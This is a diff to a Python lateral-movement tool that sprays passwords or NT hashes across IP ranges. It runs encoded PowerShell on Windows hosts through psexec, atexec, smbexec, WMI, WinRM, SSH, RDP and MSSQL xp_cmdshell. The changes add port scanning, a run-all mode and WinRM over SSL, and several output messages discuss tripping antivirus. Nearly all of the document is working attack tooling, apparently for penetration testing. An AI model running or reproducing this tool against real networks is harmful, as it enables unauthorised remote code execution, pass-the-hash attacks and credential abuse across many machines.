@@ -9,19 +9,24 @@ import subprocess
 import os
 import base64
 import sys
+import shlex
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import argparse
 import shutil
+import socket
 
-EXEC_TIMEOUT = 15
+EXEC_TIMEOUT = 20
 RDP_TIMEOUT = 45
 MAX_THREADS = 10
 
 VERBOSE = False
 OUTPUT = False
+RUN_ALL = False
+SKIP_PORTSCAN = False
 
-VALID_TOOLS = ["winrm", "smbexec", "ssh", "mssql", "wmi", "psexec", "atexec", "rdp"]
+VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
+NXC_TOOLS = {"smbexec", "wmi", "ssh", "atexec", "rdp"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
@@ -40,7 +45,8 @@ def vprint(msg):
             print(colorize(msg))
 
 def oprint(msg):
-    if OUTPUT:
+    # don't want to duplicate output, so check if verbose is enabled
+    if OUTPUT and not VERBOSE:
         with print_lock:
             print(colorize(msg))
 
@@ -80,28 +86,6 @@ def is_nthash(credential):
             return False
     return False
 
-def escape_quotes(pw):
-    out = []
-    current = ""
-    for i, ch in enumerate(pw):
-        if ch != "'":
-            current += ch
-        else:
-            if current:
-                out.append(f"'{current}'")
-                current = ""
-            if i == len(pw) - 1:
-                out.append("\\'")
-            else:
-                out.append("'\\''")
-    if current:
-        out.append(f"'{current}'")
-    return "".join(out)
-
-def quote_if_needed(value):
-    if "'" in value:
-        return escape_quotes(value)
-    return "'" + value + "'"
 
 def load_credential_file(path):
     """
@@ -159,6 +143,50 @@ def parse_tools_list(tools_str):
             tools.append(normalized)
     return tools
 
+def check_port(ip, port, timeout=1):
+    """Check if a port is open on the given IP."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        result = sock.connect_ex((ip, port))
+        sock.close()
+        return result == 0
+    except:
+        return False
+
+def scan_ports_for_tools(ip, tool_list):
+    """
+    Scan ports for given tools and return viable tools.
+    For winrm, checks port 5985 for winrm and 5986 for winrm-ssl.
+    Returns tuple of (viable_tools, open_ports)
+    """
+    viable_tools = []
+    open_ports = []
+    
+    TOOL_PORTS = {"psexec": 445, "smbexec": 445, "atexec": 445, "wmi": 135, "rdp": 3389, "mssql": 1433, "ssh": 22, "winrm": 5985,"winrm-ssl": 5986}
+    
+    tools_to_check = tool_list if tool_list else VALID_TOOLS
+    
+    for tool in tools_to_check:
+        # Check both winrm ports
+        if tool == "winrm":
+            if check_port(ip, 5985):
+                viable_tools.append("winrm")
+                if 5985 not in open_ports:
+                    open_ports.append(5985)
+            if check_port(ip, 5986):
+                viable_tools.append("winrm-ssl")
+                if 5986 not in open_ports:
+                    open_ports.append(5986)
+        elif tool in TOOL_PORTS:
+            port = TOOL_PORTS[tool]
+            if check_port(ip, port):
+                viable_tools.append(tool)
+                if port not in open_ports:
+                    open_ports.append(port)
+    
+    return viable_tools, open_ports
+
 def build_cmd(tool, user, target, credential, command, show_output=False):
     b64 = base64.b64encode(command.encode("utf-16le")).decode()
     use_hash = is_nthash(credential)
@@ -170,54 +198,69 @@ def build_cmd(tool, user, target, credential, command, show_output=False):
     # Impacket tools
     if tool == "psexec":
         cmd = impacket_cmd("psexec")
-        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
+        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                 if use_hash else
-                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
+                f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
 
     if tool == "mssql":
         cmd = impacket_cmd("mssqlclient")
-        return (f"{cmd} -hashes :{hash_val} {user}@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell 'powershell -enc {b64}'"
+        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell 'powershell -enc {b64}'"
                 if use_hash else
-                f"{cmd} {user}:{credential}@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'")
+                f"{cmd} \"{user}\":{credential}@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'")
 
     if tool == "atexec":
         cmd = impacket_cmd("atexec")
-        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
+        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                 if use_hash else
-                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
+                f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
 
-    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved more robust
+    # winrm handling - both regular and SSL variants
+    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
     if tool == "winrm":
-        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {user} -H {hash_val}"
+        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val}"
                 if use_hash else
-                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u {user} -p {credential}")
+                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential}")
+    
+    if tool == "winrm-ssl":
+        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val} --ssl"
+                if use_hash else
+                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential} --ssl")
 
     # NXC tools
     if tool == "smbexec":
-        return (f"{NXC_CMD} smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
+        return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                 if use_hash else
-                f"{NXC_CMD} smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
+                f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
     if tool == "wmi":
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u {user} -x 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u {user} -x 'powershell -enc {b64}'{nxc_output_flag}")
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}")
+
+    if tool == "ssh":
+        return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
 
     if tool == "rdp":
-        return (f"echo 'y' | {NXC_CMD} rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"echo 'y' | {NXC_CMD} rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
-
-    # Misc tools
-    if tool == "ssh":
-        return f"sshpass -p {credential} ssh -o StrictHostKeyChecking=no {user}@{target} 'powershell -enc {b64}'"
+                f"{NXC_CMD} rdp {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
 
     raise Exception(f"Unknown tool: {tool}")
 
 def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
     chain = tool_list if tool_list else VALID_TOOLS
 
+    # test both winrm types
+    expanded_chain = []
     for tool in chain:
+        if tool == "winrm":
+            expanded_chain.extend(["winrm", "winrm-ssl"])
+        elif tool not in expanded_chain:  # Avoid duplicates
+            expanded_chain.append(tool)
+
+    
+
+    for tool in expanded_chain:
         # Can't pass the hash with SSH
         if tool == "ssh" and is_nthash(credential):
             safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
@@ -228,7 +271,7 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
             continue
 
         cmd = build_cmd(tool, user, ip, credential, command, show_output)
-        safe_print(f"[i] Trying {tool}: {cmd}")
+        safe_print(f"[*] Trying {tool}: {cmd}")
 
         try:
             timeout = RDP_TIMEOUT if tool == "rdp" else EXEC_TIMEOUT
@@ -250,41 +293,56 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
             if "Found writable share" in out:
                 if "Stopping service" in out:
                     # psexec succeeded and exited (sometimes with rc 1!)
+                    if RUN_ALL:
+                        # need to run all tools, even if we succeeded
+                        safe_print(f"[+] Success! With command: {cmd}")
+                        oprint(out)
+                        continue
                     return (tool, out, cmd)
                 else:
-                    # if "Stopping service" not detected, defender likely caught binary, so it hangs
-                    safe_print(f"  [-] For {ip}: {tool} auth succeeded, but timed out likely due to defender.")
+                    # if "Stopping service" not detected, AV likely caught binary, so it hangs
+                    safe_print(f"  [-] For {ip}: {tool} auth succeeded, but timed out likely due to AV.")
                     continue
             else:
                 # made it through psexec, but no writeable shares found (will return rc 0)
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
-        # nxc tool quirks
-        if (tool in {"smbexec", "atexec", "wmi"}) and '[-]' in out:
-            safe_print(f"  [-] For {ip}: {tool} failed.")
-            continue
+        if tool == "rdp":
+            if "[-] Clipboard" in out:
+                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP.")
+                continue
+            elif "unrecognized arguments" in out:
+                safe_print(f"  [-] For {ip}: {tool} failed. NetExec is out of date; 'nxc rdp' doesn't support '-X'. Please reinstall netexec to use RDP.")
+                continue
+            elif "[-]" in out:
+                safe_print(f"  [-] For {ip}: {tool} failed.")
+                continue
+
+        if tool in NXC_TOOLS:
+            if '[-]' in out:
+                if "Could not retrieve" in out:
+                    safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but likely failed to run command. Try running without -o to avoid tripping AV.")
+                # nxc will return 0 if the tool succeeded but auth failed
+                else:
+                    safe_print(f"  [-] For {ip}: {tool} failed.")
+                continue
+            if rc == 0 and out == "":
+                # nxc tools will sometimes just fail silently
+                safe_print(f"  [-] For {ip}: {tool} failed.")
+                continue
     
         if tool == "mssql" and "ERROR" in out:
             safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
-        
-        # nxc tools will sometimes just fail silently
-        if (tool == "smbexec" or tool == "rdp" or tool == "wmi") and rc == 0 and out == "":
-            safe_print(f"  [-] For {ip}: {tool} failed.")
-            continue
-
-        if tool == "rdp":
-            if "[-] Clipboard" in out:
-                safe_print(f"  [+] For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP.")
-            elif "unrecognized arguments" in out:
-                safe_print(f"  [-] For {ip}: {tool} failed. NetExec is out of date; 'nxc rdp' doesn't support '-X'. Please reinstall netexec to use RDP.")
-            elif "[-]" in out:
-                safe_print(f"  [-] For {ip}: {tool} failed.")
-            continue
 
         # one-shotting using evil-winrm results in a return code of 1
-        if rc == 0 or (tool == "winrm" and rc == 1 and "NoMethodError" in out): 
+        if rc == 0 or (tool in ("winrm", "winrm-ssl") and rc == 1 and "NoMethodError" in out): 
+            if RUN_ALL:
+                # need to run all tools, even if we succeeded
+                safe_print(f"[+] Success! With command: {cmd}")
+                oprint(out)
+                continue
             return (tool, out, cmd)
 
         safe_print(f"  [-] For {ip}: {tool} failed.")
@@ -292,9 +350,31 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
     return None
 
 def execute_on_ip(username, ip, credential, command, tool_list=None, show_output=False):
-    safe_print(f"[*] Attempting {username}@{ip}...")
-    result = run_chain(username, ip, credential, command, tool_list, show_output)
+    
+    if SKIP_PORTSCAN:
+        safe_print(f"[*] Skipping portscan for {ip} (--skip-portscan enabled)")
+        viable_tools = tool_list if tool_list else VALID_TOOLS
+    else:
+        safe_print(f"[*] Checking applicable tools for {ip} via portscan")
+        viable_tools, open_ports = scan_ports_for_tools(ip, tool_list)
+        
+        if VERBOSE:
+            vprint(f"[v] Open ports for {ip}: {sorted(open_ports)}")
+        
+        if not viable_tools:
+            safe_print(f"[-] No required ports open for {ip}. Either it's not up, or the target is firewalled. If you want to try anyway, use --skip-portscan.")
+            return (ip, None)
+        
+        display_tools = ["winrm" if t == "winrm-ssl" else t for t in viable_tools]
+        display_tools = list(dict.fromkeys(display_tools))  
+        safe_print(f"    \033[34m[i]\033[0m Viable tools found for {ip} based on portscan: {', '.join(display_tools)}")
+    
+    result = run_chain(username, ip, credential, command, viable_tools, show_output)
 
+    if RUN_ALL:
+        safe_print(f"[*] All tools successfully run for {ip} with {username}.")
+        return (ip, None)
+        
     if result is None:
         safe_print(f"[-] All tools failed for {ip} with {username}.")
         return (ip, None)
@@ -302,7 +382,8 @@ def execute_on_ip(username, ip, credential, command, tool_list=None, show_output
     tool, out, cmd = result
     safe_print(f"[+] Success! With command: {cmd}")
     oprint(out)
-    return (ip, tool)
+    if not RUN_ALL:
+        return (ip, tool)
 
 def print_usage():
     msg = f"""
@@ -317,6 +398,8 @@ Options:
   --threads <n>        Number of concurrent threads (default: 10)
   --tools <list>       Comma-separated list of tools to try in order
   --timeout <seconds>  Number of seconds to wait on commands before timeout (default: 15)
+  --run-all            Run all tools, often running the desired command multiple times
+  --skip-portscan      Skip port scanning and attempt all tools
 
 Valid tools: {', '.join(VALID_TOOLS)}
   Aliases: evilwinrm, evil-winrm -> winrm
@@ -329,9 +412,8 @@ Credential file format (newline-separated):
 
 Examples:
   python3 exec_across_ips.py 192.168.1.1-10 admin Password123 whoami --timeout 30
-  python3 exec_across_ips.py --tools winrm 10.0.0.5 admin Password123 whoami
   python3 exec_across_ips.py --tools psexec,winrm,wmi 10.0.0.1-50 admin Pass123
-  python3 exec_across_ips.py --threads 20 192.168.1.0-255 -f creds.txt 'net user'
+  python3 exec_across_ips.py --threads 20 192.168.1.0-255 -f creds.txt 'net user' --skip-portscan
 """
     print(msg.strip())
 
@@ -346,6 +428,8 @@ def parse_args():
     parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
     parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=15, help="Number of seconds before commands timeout")
     parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
+    parser.add_argument("--run-all", action="store_true", help="Run all tools, often running the desired command multiple times")
+    parser.add_argument("--skip-portscan", action="store_true", help="Skip port scanning and attempt all tools")
     parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")
 
     parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
@@ -367,9 +451,7 @@ def parse_args():
 
 def check_dependencies():
     """Check if required tools are installed."""
-    global IMPACKET_PREFIX
-    global NXC_CMD
-    global WINRM_CMD
+    global IMPACKET_PREFIX, NXC_CMD, WINRM_CMD
 
     # Check impacket (either impacket-psexec or psexec.py)
     r1 = shutil.which("impacket-psexec")
@@ -416,7 +498,7 @@ def impacket_cmd(tool):
     return f"{tool}.py"
 
 def main():
-    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT
+    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN
 
     check_dependencies()
 
@@ -426,12 +508,17 @@ def main():
     OUTPUT = args.o
     MAX_THREADS = args.threads
     EXEC_TIMEOUT = args.timeout
+    RUN_ALL = args.run_all
+    SKIP_PORTSCAN = args.skip_portscan
 
     if args.tools:
         tool_list = parse_tools_list(args.tools)
         print(f"[*] Using tools: {', '.join(tool_list)}")
     else:
         tool_list = None
+
+    if args.skip_portscan:
+        print("\033[33m[!] Port scanning disabled (--skip-portscan). All tools will be attempted.\033[0m")
 
     if args.file:
         credential_list = load_credential_file(args.file)
@@ -457,22 +544,16 @@ def main():
         print("\033[33m[!] Output Disabled. Run with -o to see successful command output\033[0m")
     else:
         print("-" * 20)
-        print("\033[33m[!] WARNING: Output Enabled. This WILL trip defender for certain tools\033[0m")
+        print("\033[33m[!] WARNING: Output Enabled. This WILL trip AV for certain tools\033[0m")
         print("-" * 20)
 
     futures = []
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         for ip in ips:
             for (user, cred) in credential_list:
-                if not is_nthash(cred):
-                    c_user = quote_if_needed(user)
-                    c_cred = quote_if_needed(cred)
-                else:
-                    c_user = user
-                    c_cred = cred
-
+                cred = shlex.quote(cred)
                 futures.append(
-                    executor.submit(execute_on_ip, c_user, ip, c_cred, command, tool_list, OUTPUT)
+                    executor.submit(execute_on_ip, user, ip, cred, command, tool_list, OUTPUT)
                 )
 
         for future in as_completed(futures):
